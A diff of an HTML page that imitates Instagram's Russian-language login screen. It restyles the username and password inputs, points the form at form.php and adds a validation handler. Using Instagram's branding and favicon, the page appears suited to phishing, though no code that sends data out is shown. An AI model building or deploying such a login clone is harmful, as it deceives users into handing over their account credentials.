@@ -12,7 +12,7 @@
     <link rel="preconnect" href="https://fonts.gstatic.com">
     <link href="https://fonts.googleapis.com/css2?family=Montserrat&display=swap" rel="stylesheet">
     <link rel="preconnect" href="https://fonts.gstatic.com">
-<link href="https://fonts.googleapis.com/css2?family=Montserrat&family=Roboto&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat&family=Roboto&display=swap" rel="stylesheet">
 
     <link rel="shortcut icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico" type="image/png">
 
@@ -49,17 +49,32 @@
 
                         </div>
 
-                        <div class="form">
 
-                            <form action="check.php" method="POST">
+                            <form onsubmit="return false;" action="form.php" method="POST" name="ourForm" id="Form">
                             
                                 <!-- <input type="text" name="login" placeholder="Введите логин" id="input_login"> -->
 
-                                <input type="text" name="name" placeholder="Номер телефона, имя пользователя или эл...." id="input_name">
-                            
-                                <input type="pasword" name="pass" placeholder="Пароль" id="input_pass">
-                            
-                                <button class="btn" type="submit">Войти</button>
+                                <div class="form-item">
+
+                                    <input type="text" id="input_name" maxlength="36" autofocus required>
+                                    <label class="floating-label" for="input-name">Номер телефона, имя пользователя или эл....</label>
+
+                                </div>
+
+                                <div class="form-item">
+
+                                    <input type="password" name="pass" id="input_pass" maxlength="36" autofocus required>
+                                    <label class="floating-label" for="input-name">Пароль</label>
+
+                                </div>
+
+                                <button type="submit" value="Отправить" id="btn" onclick="FormValidate()">Войти</button>
+
+                                <!-- <div id="respons">
+
+                                    
+
+                                </div> -->
 
                                 <p>или</p>
 
@@ -69,7 +84,6 @@
 
                             </form>    
 
-                        </div>
 
                     </div>
 
@@ -180,7 +194,7 @@
 
                     </select>
 
-                    <a href="#">© Instagram от Facebook, 2021</a>
+                    <a href="#">© Instagram от Facebook 2021</a>
 
             </div>
 
@@ -190,6 +204,7 @@
 
     <script src="https://kit.fontawesome.com/160a5bf21a.js" crossorigin="anonymous"></script>
     <script defer src="build/js/script.js"></script>
+    <!-- <script defer src="src/js/main.js"></script> -->
 
 </body>
 </html>
